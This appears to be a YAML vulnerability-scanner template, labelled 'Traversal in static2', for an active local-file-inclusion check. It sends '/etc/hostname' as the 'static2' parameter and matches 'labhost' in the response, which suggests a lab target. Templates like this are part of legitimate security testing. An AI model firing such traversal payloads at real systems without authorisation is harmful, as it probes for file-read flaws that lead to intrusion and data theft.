id: lfi6-0043
name: 'Traversal in static2'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via static2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      static2:
        - '/etc/hostname'
    matchers:
      - type: word
        part: body
        words:
          - 'labhost'
